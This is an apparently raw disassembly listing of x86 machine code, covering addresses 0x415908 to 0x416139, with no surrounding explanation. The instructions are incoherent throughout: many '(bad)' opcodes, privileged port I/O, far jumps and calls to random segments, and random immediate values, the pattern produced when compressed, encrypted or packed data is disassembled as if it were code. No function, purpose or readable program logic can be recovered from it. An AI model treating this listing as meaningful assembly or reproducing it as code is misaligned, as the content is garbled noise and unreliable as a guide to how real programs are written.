  415908:	leave  
  415909:	daa    
  41590a:	icebp  
  41590b:	(bad)  
  41590c:	xor    BYTE PTR [eax-0x5e],dl
  41590f:	imul   eax,DWORD PTR [eax],0x44
  415912:	xchg   eax,ecx
  415914:	mov    ds:0x313c4787,al
  415919:	add    dh,BYTE PTR [ecx+0x7d08cd4b]
  41591f:	mov    ebp,0xda7a887f
  415924:	jmp    0x22bf135d
  415929:	cmp    esp,DWORD PTR [ecx+0x12]
  41592c:	aaa    
  41592d:	xchg   ebx,eax
  41592e:	jmp    0x2c51660d
  415933:	dec    eax
  415934:	loopne 0x415995
  415936:	fsub   DWORD PTR [ecx]
  415938:	int    0x24
  41593a:	sbb    BYTE PTR [ecx-0x45],cl
  41593d:	jb     0x415974
  41593f:	icebp  
  415940:	fdivr  st(3),st
  415942:	dec    esi
  415943:	or     eax,0xc3d98b9
  415948:	pop    ss
  415949:	repnz daa 
  41594b:	mul    BYTE PTR [ebp-0x19fe24dd]
  415951:	pop    eax
  415952:	jle    0x415917
  415954:	sub    eax,DWORD PTR [edx-0x2b3dc4a9]
  41595a:	or     ecx,DWORD PTR [ecx+0x3a]
  41595d:	dec    edx
  41595e:	mov    ah,0xef
  415960:	out    dx,eax
  415961:	shl    BYTE PTR [ebp+ebp*4-0x3b],0xcd
  415966:	mov    ch,0xe3
  415968:	add    eax,0x1e04765
  41596d:	shr    BYTE PTR [edx+esi*2-0x55],0xce
  415972:	mul    DWORD PTR [edi+0x28f61c98]
  415978:	bound  ebx,QWORD PTR [ebx-0x4323f395]
  41597e:	xor    edi,DWORD PTR [ebp-0x26811949]
  415984:	scas   al,BYTE PTR es:[edi]
  415985:	ins    DWORD PTR es:[edi],dx
  415986:	test   BYTE PTR [edi-0x3a],dh
  415989:	pop    edi
  41598a:	dec    edx
  41598b:	pop    esi
  41598c:	leave  
  41598d:	shr    BYTE PTR [edx+0x7e],1
  415990:	out    dx,al
  415991:	in     al,0x35
  415993:	xchg   ebp,eax
  415994:	cmp    eax,0x8f8b39e7
  415999:	push   edi
  41599a:	gs out dx,eax
  41599c:	jle    0x41595c
  41599e:	mov    bh,0x46
  4159a0:	sbb    eax,0xac0da0f2
  4159a5:	dec    edx
  4159a6:	sub    al,0xfe
  4159a8:	scas   eax,DWORD PTR es:[edi]
  4159a9:	dec    edi
  4159aa:	push   edi
  4159ab:	lock nop
  4159ad:	mov    eax,0x5a385b6
  4159b2:	inc    ebx
  4159b3:	enter  0x13bd,0x50
  4159b7:	push   es
  4159b8:	fidivr WORD PTR [eax]
  4159ba:	xchg   ebx,eax
  4159bb:	cli    
  4159bc:	mov    BYTE PTR [edi],al
  4159be:	dec    eax
  4159bf:	fld    TBYTE PTR [edi+0x43]
  4159c2:	cwde   
  4159c3:	imul   esp,DWORD PTR [ebx+0x43],0x215a6190
  4159ca:	push   eax
  4159cb:	adc    ecx,edx
  4159cd:	out    0xc5,al
  4159cf:	jnp    0x415a2b
  4159d1:	daa    
  4159d2:	jno    0x415a2b
  4159d4:	jcxz   0x4159bc
  4159d7:	add    eax,0xe033e072
  4159dc:	loope  0x415967
  4159de:	mov    esi,0x68e471ef
  4159e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e4:	pop    es
  4159e5:	xor    bl,BYTE PTR [ecx+eiz*4+0x48]
  4159e9:	pslld  mm5,QWORD PTR [edx]
  4159ec:	sahf   
  4159ed:	ds or  al,0x4f
  4159f0:	cmp    ebp,DWORD PTR [ebx-0x52]
  4159f3:	sbb    eax,0xaa650a08
  4159f8:	xchg   ecx,eax
  4159f9:	js     0x41597c
  4159fb:	fwait
  4159fc:	or     dh,BYTE PTR [edx-0x288ae7d9]
  415a02:	xchg   ecx,eax
  415a03:	push   ds
  415a04:	sar    BYTE PTR [eax-0x48723f1e],0x17
  415a0b:	xchg   ebp,eax
  415a0c:	mov    ah,0x9f
  415a0e:	mov    ds:0xb3d1c988,al
  415a13:	or     eax,DWORD PTR [esi]
  415a15:	in     al,dx
  415a16:	in     eax,0x1a
  415a18:	pushf  
  415a19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a1a:	inc    eax
  415a1b:	xor    eax,0x6210e42c
  415a20:	fldpi  
  415a22:	push   esi
  415a23:	cmp    al,0x33
  415a25:	icebp  
  415a26:	pop    ebx
  415a27:	cdq    
  415a28:	fmul   st,st(6)
  415a2a:	jb     0x4159eb
  415a2c:	ds pop esp
  415a2e:	js     0x415a4a
  415a30:	mov    dh,0x89
  415a32:	sti    
  415a33:	imul   ecx,DWORD PTR [edi+0x19],0x4c
  415a37:	and    bl,dl
  415a39:	jl     0x415a0d
  415a3b:	xor    DWORD PTR [edx-0x1fb341cc],edi
  415a41:	(bad)  
  415a42:	pop    esi
  415a43:	adc    eax,0x47162047
  415a48:	ja     0x415a09
  415a4a:	aaa    
  415a4b:	mov    ecx,0x87b22da4
  415a50:	mov    bh,0xb
  415a52:	imul   ebx,DWORD PTR [eax-0x4257cba8],0xffffff8c
  415a59:	sub    BYTE PTR [ebp+ecx*1+0x44],cl
  415a5d:	pop    esi
  415a5e:	sub    BYTE PTR [ecx],dl
  415a60:	adc    BYTE PTR [esi+0x32],ah
  415a63:	fdivp  st(1),st
  415a65:	xchg   DWORD PTR [eax-0x262d2def],esi
  415a6b:	xchg   edi,eax
  415a6c:	gs aam 0x5e
  415a6f:	iret   
  415a70:	mov    ds:0x666c41e7,eax
  415a75:	push   edi
  415a76:	call   0xc6adb28a
  415a7b:	jne    0x415a36
  415a7d:	out    dx,eax
  415a7e:	inc    ebx
  415a7f:	lods   al,BYTE PTR ds:[esi]
  415a80:	mov    bh,0xa3
  415a82:	imul   esi,DWORD PTR [ebp+0x4f],0x22
  415a86:	xchg   DWORD PTR [edi+0x75f938ae],esp
  415a8c:	mov    ah,0x7c
  415a8e:	(bad)  
  415a8f:	mov    dh,0x72
  415a91:	cld    
  415a92:	cdq    
  415a93:	cmp    BYTE PTR [ecx-0x63],bl
  415a96:	pop    esi
  415a97:	jecxz  0x415b16
  415a99:	outs   dx,DWORD PTR ds:[esi]
  415a9a:	in     al,0x9a
  415a9c:	stos   DWORD PTR es:[edi],eax
  415a9d:	int3   
  415a9e:	rol    BYTE PTR [esi+ebx*8-0xedb320d],0x3d
  415aa6:	push   edi
  415aa7:	mov    cl,0xab
  415aa9:	jmp    0x9c0c:0x72bc6c28
  415ab0:	outs   dx,BYTE PTR ds:[esi]
  415ab1:	clc    
  415ab2:	mov    ecx,0x57112e2f
  415ab7:	les    esi,FWORD PTR [ebx-0x4d]
  415aba:	and    al,0x72
  415abc:	inc    ebp
  415abd:	xchg   ecx,eax
  415abe:	cs dec edx
  415ac0:	and    al,0xfc
  415ac2:	mov    esi,0xc690efb3
  415ac7:	add    BYTE PTR [edi-0x5f7eff31],cl
  415acd:	sahf   
  415ace:	ins    DWORD PTR es:[edi],dx
  415acf:	outs   dx,DWORD PTR es:[esi]
  415ad1:	mov    ch,ah
  415ad3:	pop    eax
  415ad4:	daa    
  415ad5:	inc    ebx
  415ad6:	outs   dx,BYTE PTR ds:[esi]
  415ad7:	mov    dl,BYTE PTR [edi+edi*2]
  415ada:	mov    edx,0x230c6110
  415adf:	sub    cl,BYTE PTR [eax+ecx*2+0x24]
  415ae3:	lds    dx,DWORD PTR [edx-0x3d809755]
  415aea:	push   ss
  415aeb:	cmp    edi,DWORD PTR [eax+0x3a6a6217]
  415af1:	cdq    
  415af2:	shl    ebp,0xfd
  415af5:	in     al,dx
  415af6:	lea    edi,[eax+0x753cbdde]
  415afc:	lds    ecx,FWORD PTR [ebp+0x36]
  415aff:	dec    ebp
  415b00:	jle    0x415afc
  415b02:	sbb    ebx,DWORD PTR [esi+0x11]
  415b05:	fsubr  QWORD PTR [edx-0x4e]
  415b08:	lock xchg ecx,eax
  415b0a:	aaa    
  415b0b:	lea    ebp,[ecx-0x30072909]
  415b11:	pop    edx
  415b12:	call   0x11ac:0x831c9f5
  415b19:	push   ss
  415b1a:	add    cl,BYTE PTR [edi]
  415b1c:	mov    esp,0x2b1e783e
  415b21:	shl    esp,cl
  415b23:	xchg   esp,eax
  415b24:	dec    ebx
  415b25:	sar    DWORD PTR [esi-0x34020393],0xe5
  415b2c:	mov    ebx,0xabb538e7
  415b31:	jnp    0x415b40
  415b33:	ret    0x3695
  415b36:	push   ebx
  415b37:	jmp    0x415ba0
  415b39:	and    bh,ah
  415b3b:	sahf   
  415b3c:	pop    ss
  415b3d:	jle    0x415ac1
  415b3f:	mov    al,0x1
  415b41:	sbb    al,cl
  415b43:	add    al,0xb8
  415b45:	imul   esp,DWORD PTR [ebx-0x8],0x20
  415b49:	xchg   edx,eax
  415b4a:	push   0xffffff95
  415b4c:	xchg   edx,eax
  415b4d:	add    eax,0x24ca136a
  415b52:	dec    ebx
  415b53:	adc    al,0x85
  415b55:	je     0x415b58
  415b57:	jo     0x415b6c
  415b59:	jecxz  0x415b15
  415b5b:	mov    dh,0x3a
  415b5d:	pop    ss
  415b5e:	inc    esi
  415b5f:	mov    ecx,0x6c1145f2
  415b64:	(bad)  
  415b66:	loope  0x415b01
  415b68:	push   edx
  415b69:	mov    BYTE PTR [ebp+0x62],cl
  415b6c:	mov    es,WORD PTR [eax]
  415b6e:	ins    BYTE PTR es:[edi],dx
  415b6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b70:	dec    ebx
  415b71:	dec    edx
  415b72:	push   cs
  415b73:	leave  
  415b74:	pop    esp
  415b75:	dec    ecx
  415b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b77:	jmp    0x9047:0xa528dc4f
  415b7e:	xor    eax,edx
  415b80:	dec    edx
  415b81:	lock pusha 
  415b83:	xlat   BYTE PTR ds:[ebx]
  415b84:	jbe    0x415b19
  415b86:	jle    0x415b4d
  415b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b89:	fdiv   DWORD PTR [edx+0x178c5b62]
  415b8f:	aad    0xe8
  415b91:	repz jmp 0x415c07
  415b94:	aam    0x76
  415b96:	arpl   dx,di
  415b98:	cmp    BYTE PTR [edx],0x70
  415b9b:	mov    DWORD PTR [edi-0x76],edi
  415b9e:	rcl    DWORD PTR [edx+0x53aaaf42],0x49
  415ba5:	or     BYTE PTR [ebp-0x27b5c69d],cl
  415bab:	stc    
  415bac:	pop    ebx
  415bad:	adc    eax,0x2a6e15aa
  415bb2:	push   ds
  415bb3:	out    0xe5,al
  415bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bb6:	imul   cl
  415bb8:	or     DWORD PTR ds:0x99a32d47,ecx
  415bbe:	cdq    
  415bbf:	jmp    0xf9aa:0xc452241
  415bc6:	push   ds
  415bc7:	push   cs
  415bc8:	mov    eax,ebx
  415bca:	fcomi  st,st(3)
  415bcc:	pop    es
  415bcd:	mov    al,0xd6
  415bcf:	push   es
  415bd0:	call   0x7f07:0x9b0267ee
  415bd7:	xchg   ecx,eax
  415bd8:	and    al,ch
  415bda:	popa   
  415bdb:	fs mov ch,bl
  415bde:	pop    edi
  415bdf:	popf   
  415be0:	into   
  415be1:	hlt    
  415be2:	xor    ch,BYTE PTR [ebp+0x1c8a16fa]
  415be8:	sar    eax,cl
  415bea:	cmp    ah,dh
  415bec:	pop    edx
  415bed:	adc    ebx,DWORD PTR [ecx]
  415bef:	mov    bl,0x8
  415bf1:	pusha  
  415bf2:	and    ecx,edx
  415bf4:	adc    ebx,edx
  415bf6:	mov    eax,ds:0x72c21b85
  415bfb:	scas   eax,DWORD PTR es:[edi]
  415bfc:	addr16 mov bh,0x75
  415bff:	cmp    eax,0xda8bfaca
  415c04:	dec    esp
  415c05:	icebp  
  415c06:	retf   
  415c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c08:	ror    BYTE PTR [eax+0x68],cl
  415c0b:	or     BYTE PTR ds:0x1c6d41a2,ah
  415c11:	mov    ebp,0x9fa17b21
  415c16:	add    BYTE PTR [ebp-0x763831c2],cl
  415c1c:	or     DWORD PTR [ebp+0x6b920989],ebp
  415c22:	mov    edi,0x36984788
  415c27:	xchg   DWORD PTR [edi+0x1b84b432],esp
  415c2d:	and    eax,0x7ec2d7e3
  415c32:	add    esp,DWORD PTR [ecx]
  415c34:	inc    ecx
  415c35:	pop    ebp
  415c36:	test   BYTE PTR ds:0xb63ec6c,0x41
  415c3d:	pop    esi
  415c3e:	and    DWORD PTR [eax],ebp
  415c40:	pusha  
  415c41:	xchg   edi,eax
  415c42:	in     al,dx
  415c43:	sbb    BYTE PTR [edx],ah
  415c45:	aaa    
  415c46:	cmp    dh,BYTE PTR [edi]
  415c48:	inc    ebp
  415c49:	leave  
  415c4a:	test   DWORD PTR [eax],edi
  415c4c:	xchg   ebp,eax
  415c4d:	sub    bh,BYTE PTR [esi+eiz*1-0x5c987300]
  415c54:	mov    al,0x6c
  415c56:	mov    DWORD PTR [edx-0x75],edx
  415c59:	fs xchg esi,eax
  415c5b:	repz rcr BYTE PTR ds:0xf7ab1c41,cl
  415c62:	scas   al,BYTE PTR es:[edi]
  415c63:	fstp   DWORD PTR [ecx]
  415c65:	jnp    0x415c9d
  415c67:	popf   
  415c68:	pop    ds
  415c69:	or     ebx,ecx
  415c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c6c:	push   edi
  415c6d:	push   esp
  415c6e:	nop
  415c6f:	and    eax,esp
  415c71:	ret    
  415c72:	jge    0x415cf3
  415c74:	test   eax,0x724cb221
  415c79:	hlt    
  415c7a:	nop
  415c7b:	cdq    
  415c7c:	clc    
  415c7d:	mov    BYTE PTR [eax+0x4d61e83c],0xc9
  415c84:	(bad)  
  415c85:	aam    0x18
  415c87:	scas   eax,DWORD PTR es:[edi]
  415c88:	jns    0x415c40
  415c8a:	jp     0x415cbe
  415c8c:	xor    esi,esi
  415c8e:	mov    esi,0x9135a274
  415c93:	out    0x53,eax
  415c95:	ja     0x415cd2
  415c97:	sbb    BYTE PTR [eax],al
	...
  415d11:	add    BYTE PTR [eax],al
  415d13:	add    BYTE PTR [ebp-0x29],dl
  415d16:	mov    edx,0x7defba87
  415d1b:	xlat   BYTE PTR ds:[ebx]
  415d1c:	lea    esp,[esi+edx*4+0x6a]
  415d20:	mov    esp,0x97b314c
  415d25:	add    al,BYTE PTR [ecx]
  415d27:	add    BYTE PTR [edi+eax*1+0x0],ch
  415d2b:	add    BYTE PTR [eax-0x137fc7e7],ah
  415d31:	mov    ds:0x974cdebd,eax
  415d36:	test   al,0x7
  415d38:	outs   dx,BYTE PTR ds:[esi]
  415d39:	jle    0x415d5c
  415d3b:	xchg   edi,eax
  415d3c:	push   esi
  415d3d:	adc    esi,DWORD PTR [ecx+0x31]
  415d40:	inc    ebp
  415d41:	add    al,0x95
  415d43:	sub    eax,0x4bbb0763
  415d48:	mov    BYTE PTR [edx],bh
  415d4a:	bnd js 0x415d7f
  415d4d:	jmp    0xc1d:0x52ade98
  415d54:	xor    eax,0x25813bb0
  415d59:	cli    
  415d5a:	push   es
  415d5b:	cmp    DWORD PTR [esi],esi
  415d5d:	mov    cl,0xeb
  415d5f:	dec    edx
  415d60:	jb     0x415d2e
  415d62:	(bad)  
  415d63:	sets   BYTE PTR [ecx+0x1a]
  415d67:	test   eax,0x2bd6f8e3
  415d6c:	adc    cl,BYTE PTR [eax+0x16964cae]
  415d72:	sub    cl,BYTE PTR [edi-0xb]
  415d75:	mov    DWORD PTR [edx],edx
  415d77:	or     DWORD PTR [eax+0x14],edx
  415d7a:	(bad)  
  415d7b:	in     eax,dx
  415d7c:	jmp    FWORD PTR [esi-0x6095bc7f]
  415d82:	inc    esp
  415d83:	iret   
  415d84:	cmp    DWORD PTR [ebx+0x58],esi
  415d87:	or     al,0xb3
  415d89:	xor    BYTE PTR [esp+ecx*4-0x48cf47ff],dh
  415d90:	nop
  415d91:	sub    dl,BYTE PTR ss:[eax+0x54ad314c]
  415d98:	loope  0x415e01
  415d9a:	ret    0x1ccb
  415d9d:	cli    
  415d9e:	mov    al,ds:0x5c39f30f
  415da3:	pop    esp
  415da4:	sbb    BYTE PTR [esi+0x50],ch
  415da7:	(bad)  
  415da8:	int    0x95
  415daa:	dec    ecx
  415dab:	pusha  
  415dac:	(bad)  
  415dad:	out    0x7a,al
  415daf:	retf   
  415db0:	mov    cl,BYTE PTR [ecx+ebp*2]
  415db3:	sub    cl,bl
  415db5:	fadd   st(7),st
  415db7:	push   0x1376bac1
  415dbc:	mov    eax,0x8471a1f0
  415dc1:	in     al,0xf9
  415dc3:	(bad)  
  415dc4:	and    eax,0xc3b8c843
  415dc9:	rol    bh,0xf6
  415dcc:	lods   al,BYTE PTR ds:[esi]
  415dcd:	(bad)  
  415dcf:	lds    ebp,FWORD PTR [edx-0x2626c25e]
  415dd5:	lds    edi,FWORD PTR [esi+ebx*1+0x81d9998]
  415ddc:	inc    esi
  415ddd:	dec    esi
  415dde:	xlat   BYTE PTR ds:[ebx]
  415ddf:	mov    ch,0xc1
  415de1:	inc    eax
  415de2:	fstp   TBYTE PTR [ebx+edi*8-0x7062734]
  415de9:	test   al,0x10
  415deb:	dec    eax
  415dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ded:	and    edx,DWORD PTR [edx+0x71c72bc1]
  415df3:	push   ebx
  415df4:	inc    ecx
  415df5:	lods   al,BYTE PTR ds:[esi]
  415df6:	(bad)  
  415df7:	fist   WORD PTR [ebp-0x13]
  415dfa:	jge    0x415e5c
  415dfc:	push   ebp
  415dfd:	(bad)  
  415dfe:	xlat   BYTE PTR ds:[ebx]
  415dff:	mov    DWORD PTR [ecx-0x72dffea],eax
  415e05:	in     eax,dx
  415e06:	dec    DWORD PTR [eax]
  415e08:	jmp    0x3015a1d1
  415e0d:	cmp    BYTE PTR [esi],dl
  415e0f:	adc    al,bh
  415e11:	cdq    
  415e12:	repnz inc edi
  415e14:	hlt    
  415e15:	xchg   ecx,eax
  415e16:	pop    ecx
  415e17:	pop    ecx
  415e18:	in     eax,0x34
  415e1a:	cmc    
  415e1b:	loop   0x415ddb
  415e1d:	cli    
  415e1e:	(bad)  
  415e1f:	int    0x29
  415e21:	xchg   edi,eax
  415e22:	sahf   
  415e23:	pop    ebp
  415e24:	stc    
  415e25:	xchg   BYTE PTR [ecx-0x59],cl
  415e28:	cmp    al,0xca
  415e2a:	mov    cl,0x6a
  415e2c:	inc    esi
  415e2d:	xor    BYTE PTR [eax+0xe],0xd5
  415e31:	shr    DWORD PTR [esi+0x4b1627cf],0xe8
  415e38:	sbb    dl,BYTE PTR [ebp+esi*8+0x455ced9b]
  415e3f:	jae    0x415e56
  415e41:	add    al,bl
  415e43:	sub    BYTE PTR [edi],ah
  415e45:	clc    
  415e46:	jnp    0x415e05
  415e48:	cmp    al,0xc5
  415e4a:	in     eax,dx
  415e4b:	cmp    DWORD PTR [edx-0x63],0xb94f4352
  415e52:	xchg   esi,esi
  415e54:	add    DWORD PTR [edi+eiz*8+0x15453c44],ebx
  415e5b:	mov    eax,ds:0x5c1a64b1
  415e60:	mov    eax,0xc6345b9d
  415e65:	das    
  415e66:	int    0x8d
  415e68:	mov    bh,0x95
  415e6a:	mov    ebp,0x698ac0fc
  415e6f:	je     0x415e58
  415e71:	lock xor eax,0xe33f8c60
  415e77:	push   ss
  415e78:	mov    edx,edi
  415e7a:	pop    esp
  415e7b:	pop    ss
  415e7c:	mov    bh,cl
  415e7e:	in     al,dx
  415e7f:	sub    DWORD PTR [esi+0x63693995],edx
  415e85:	inc    ebp
  415e86:	xchg   esi,eax
  415e87:	and    eax,0xb0cbde91
  415e8c:	fucomi st,st(3)
  415e8e:	gs enter 0xd24e,0x4a
  415e93:	ds xchg esp,eax
  415e95:	or     esp,DWORD PTR [eax]
  415e97:	jmp    FWORD PTR [esi+0x6ea4a40c]
  415e9d:	test   BYTE PTR [ecx+0x5402083b],bh
  415ea3:	dec    ebp
  415ea4:	sbb    dh,BYTE PTR [ecx]
  415ea6:	adc    dh,ah
  415ea8:	loop   0x415f12
  415eaa:	pop    edi
  415eab:	sub    bh,bl
  415ead:	je     0x415e84
  415eaf:	dec    edi
  415eb0:	and    si,WORD PTR [eax-0x2e6a493b]
  415eb7:	test   DWORD PTR [ebp+0x31],ebx
  415eba:	xor    eax,0x3a604d72
  415ebf:	push   eax
  415ec0:	call   0x5ebe:0x5c439f51
  415ec7:	jp     0x415f12
  415ec9:	popf   
  415eca:	xor    DWORD PTR [esi-0x62],ebp
  415ecd:	jg     0x415ed1
  415ecf:	pop    ds
  415ed0:	das    
  415ed1:	push   esi
  415ed2:	jg     0x415ed6
  415ed4:	add    edx,edx
  415ed6:	pop    ebx
  415ed7:	and    ebp,DWORD PTR [ebx+ebp*8+0x725a98f0]
  415ede:	push   ds
  415edf:	mov    bl,0x6a
  415ee1:	jne    0x415ed8
  415ee3:	mov    ds:0x4e4d2e73,eax
  415ee8:	loope  0x415f25
  415eea:	xchg   esp,eax
  415eeb:	shr    BYTE PTR [eax],cl
  415eed:	add    al,0x18
  415eef:	inc    esi
  415ef0:	pop    ss
  415ef1:	jb     0x415ea2
  415ef3:	inc    ecx
  415ef4:	push   ss
  415ef5:	icebp  
  415ef6:	stos   DWORD PTR es:[edi],eax
  415ef7:	jle    0x415f60
  415ef9:	mov    ds:0xba094edc,eax
  415efe:	pop    esp
  415eff:	nop
  415f00:	and    al,0xf0
  415f02:	sub    BYTE PTR [ebp+0x787e1719],dl
  415f08:	mov    dl,0x91
  415f0a:	dec    esp
  415f0b:	and    DWORD PTR [ebx+ebx*4],edx
  415f0e:	sar    cl,1
  415f10:	push   ecx
  415f11:	pop    esi
  415f12:	add    ch,BYTE PTR [ecx]
  415f14:	imul   esi,DWORD PTR [ebp-0x67],0x5
  415f18:	jle    0x415edd
  415f1a:	inc    BYTE PTR [esi-0x57]
  415f1d:	and    ebp,esi
  415f1f:	ret    
  415f20:	pop    esp
  415f21:	cmp    dh,BYTE PTR [esi-0x58f3c0c6]
  415f27:	hlt    
  415f28:	sub    BYTE PTR [esp+edi*8+0x2cf23103],0x57
  415f30:	fcmovu st,st(1)
  415f32:	jmp    0x66c823ac
  415f37:	mov    DWORD PTR [ecx-0x5f],ebx
  415f3a:	frstor [ebx+0x4e]
  415f3d:	jne    0x415ef0
  415f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f40:	cmp    edi,DWORD PTR [ebp+0x3f5967da]
  415f46:	and    BYTE PTR [esi],al
  415f48:	sbb    BYTE PTR [eax-0x65],0xca
  415f4c:	test   al,0xa7
  415f4e:	xor    ch,dl
  415f50:	xchg   ebp,eax
  415f51:	jmp    0x988f:0xe8a324e8
  415f58:	sar    bl,cl
  415f5a:	jl     0x415fa5
  415f5c:	js     0x415eef
  415f5e:	test   BYTE PTR [ebx],ch
  415f60:	aas    
  415f61:	mov    cl,0x5c
  415f63:	mov    ebx,0xbde7488b
  415f68:	call   0x4a57:0x195e7117
  415f6f:	loope  0x415fa0
  415f71:	in     eax,0xb
  415f73:	push   ebx
  415f74:	loope  0x415fc0
  415f76:	arpl   WORD PTR [ecx+0x38],si
  415f79:	ins    BYTE PTR es:[edi],dx
  415f7a:	dec    eax
  415f7b:	push   ecx
  415f7c:	retf   
  415f7d:	lock fwait
  415f7f:	mov    eax,ds:0x25020532
  415f84:	cmp    DWORD PTR [eax+0x72],edi
  415f87:	nop
  415f88:	sahf   
  415f89:	jmp    0xd76049ee
  415f8e:	in     eax,dx
  415f8f:	outs   dx,BYTE PTR ds:[esi]
  415f90:	cmp    BYTE PTR [esi+0x15699af2],ch
  415f96:	inc    edx
  415f97:	jne    0x416006
  415f99:	in     al,0x26
  415f9b:	cmc    
  415f9c:	push   edx
  415f9d:	mov    edi,0x2f9f9c62
  415fa2:	test   eax,0x75057d8
  415fa7:	push   eax
  415fa8:	sub    eax,0xc57b2527
  415fad:	loop   0x415fe7
  415faf:	and    ebp,esi
  415fb1:	xor    eax,0x3ca53b53
  415fb6:	lods   eax,DWORD PTR ds:[esi]
  415fb7:	adc    al,BYTE PTR [esi+0x0]
  415fba:	aaa    
  415fbb:	retf   0xcc92
  415fbe:	into   
  415fbf:	push   0x14
  415fc1:	push   0xc994ce26
  415fc6:	gs scas al,BYTE PTR es:[edi]
  415fc8:	jb     0x41600c
  415fca:	aas    
  415fcb:	push   0x6dc5ccc7
  415fd0:	mov    ebp,0xd8aeeca6
  415fd5:	scas   eax,DWORD PTR es:[edi]
  415fd6:	inc    esi
  415fd7:	jb     0x415fbe
  415fd9:	mov    ecx,0x516ef7e5
  415fde:	scas   eax,DWORD PTR es:[edi]
  415fdf:	mov    ebp,0xb5c330fb
  415fe4:	outs   dx,BYTE PTR ds:[esi]
  415fe5:	sub    BYTE PTR [eax-0x2fa0522a],0x95
  415fec:	pop    eax
  415fed:	clc    
  415fee:	lods   eax,DWORD PTR ds:[esi]
  415fef:	and    al,0x2f
  415ff1:	mov    ds:0x8273e1b8,al
  415ff6:	rol    BYTE PTR [edi],0x18
  415ff9:	ss xor al,0x84
  415ffc:	dec    esi
  415ffd:	call   0x66346cd5
  416002:	pushf  
  416003:	ficomp WORD PTR [edx-0x25]
  416006:	les    ebx,FWORD PTR [ebx+0x30]
  416009:	shl    al,1
  41600b:	js     0x416035
  41600d:	xchg   esi,eax
  41600e:	jnp    0x41601a
  416010:	mov    bh,0xc9
  416012:	xchg   ebx,eax
  416013:	pop    ebp
  416014:	and    eax,0x944c19ac
  416019:	mov    dh,0x44
  41601b:	xor    DWORD PTR [edx],esi
  41601d:	and    al,0x26
  41601f:	aam    0xd8
  416021:	mov    ebp,0x8ee89d38
  416026:	push   ds
  416027:	jge    0x415fe5
  416029:	enter  0xea86,0x15
  41602d:	shr    DWORD PTR [ebx-0x2c],cl
  416030:	and    esi,DWORD PTR [ebx]
  416032:	xlat   BYTE PTR ds:[ebx]
  416033:	(bad)  
  416035:	mov    ds:0x2c1cfd6a,al
  41603a:	adc    eax,0x743e05d8
  41603f:	add    BYTE PTR [ebx+eax*8+0x3a857252],dl
  416046:	jl     0x416059
  416048:	jnp    0x416072
  41604a:	push   ss
  41604b:	jle    0x415fcd
  41604d:	inc    esi
  41604e:	push   ebx
  41604f:	int    0x6b
  416051:	xor    eax,0xa6e3ac02
  416056:	dec    eax
  416057:	and    ch,BYTE PTR [ebp-0x5b]
  41605a:	and    BYTE PTR [eax-0x1909376e],dh
  416060:	in     al,0xe9
  416062:	pop    ds
  416063:	imul   eax,DWORD PTR [eax+0x43],0xffffff99
  416067:	fnsave [edx+0x25e9cd24]
  41606d:	cwde   
  41606e:	mov    BYTE PTR [ebp+edx*4-0x5cd3d1df],dl
  416075:	jp     0x416036
  416077:	mov    WORD PTR [ecx-0x6d139f81],es
  41607d:	mov    dl,al
  41607f:	pop    edx
  416080:	ret    
  416081:	push   esi
  416082:	adc    eax,0xb63c0fe8
  416087:	or     eax,0x41127e96
  41608c:	add    bl,0x4
  41608f:	sub    eax,0x3f1b590a
  416094:	inc    edi
  416095:	xchg   ecx,eax
  416096:	in     al,dx
  416097:	push   ds
  416098:	lahf   
  416099:	(bad)  
  41609a:	movaps xmm3,XMMWORD PTR [edi+0x21640ec6]
  4160a1:	cmp    ecx,DWORD PTR [esi]
  4160a3:	in     al,0x52
  4160a5:	lds    ebp,FWORD PTR [edx+eiz*1]
  4160a8:	xchg   ecx,eax
  4160a9:	enter  0x8d0a,0xb2
  4160ad:	scas   eax,DWORD PTR es:[edi]
  4160ae:	imul   edx,DWORD PTR [ebp+0x4f],0xffffffb3
  4160b2:	pop    ebp
  4160b3:	call   0x83e3:0x6c0defc3
  4160ba:	scas   eax,DWORD PTR es:[edi]
  4160bb:	add    al,0x4a
  4160bd:	js     0x4160a4
  4160bf:	xchg   ebp,eax
  4160c0:	xchg   edi,eax
  4160c1:	jmp    0x4160ae
  4160c3:	inc    esp
  4160c4:	mov    cl,ch
  4160c6:	xchg   DWORD PTR ds:0x4814500b,edx
  4160cc:	inc    BYTE PTR [ebp-0x4c]
  4160cf:	push   eax
  4160d0:	pop    ecx
  4160d1:	and    al,0x89
  4160d3:	sub    dl,BYTE PTR [ebp-0x61b21cc8]
  4160d9:	jmp    0x4160bd
  4160db:	out    dx,eax
  4160dc:	enter  0x4e5c,0x5b
  4160e0:	mov    dl,0x26
  4160e2:	adc    esp,eax
  4160e4:	xor    BYTE PTR [esi+0x17883a7c],0x87
  4160eb:	imul   ecx,DWORD PTR [edi],0x5f9d8d66
  4160f1:	push   ecx
  4160f2:	fcomi  st,st(6)
  4160f4:	dec    ecx
  4160f5:	lock jp 0x4160a3
  4160f8:	adc    al,0xa5
  4160fa:	ja     0x416135
  4160fc:	adc    dl,ah
  4160fe:	xchg   ebp,eax
  4160ff:	repnz scas al,BYTE PTR es:[edi]
  416101:	nop
  416102:	shl    ch,1
  416104:	stos   BYTE PTR es:[edi],al
  416105:	mov    ah,0x5e
  416107:	into   
  416108:	leave  
  416109:	ror    BYTE PTR [edi+ebx*1-0x67],cl
  41610d:	(bad)  
  41610e:	out    0xef,al
  416110:	mov    cl,0x7f
  416112:	lds    edi,FWORD PTR [ebx-0x28a311d1]
  416118:	cmp    al,cl
  41611a:	lods   eax,DWORD PTR ds:[esi]
  41611b:	ret    0xacb6
  41611e:	jmp    0xff0d0b0
  416123:	cld    
  416124:	cmc    
  416125:	pusha  
  416126:	inc    ecx
  416127:	xchg   esi,eax
  416128:	loope  0x41610b
  41612a:	lahf   
  41612b:	aas    
  41612c:	popa   
  41612d:	mov    eax,0x788e75d2
  416132:	retf   0xd46
  416135:	inc    eax
  416136:	gs jecxz 0x41618b
  416139:	sar    BYTE PTR [ebx+ebp*2-0x8cf959c],cl
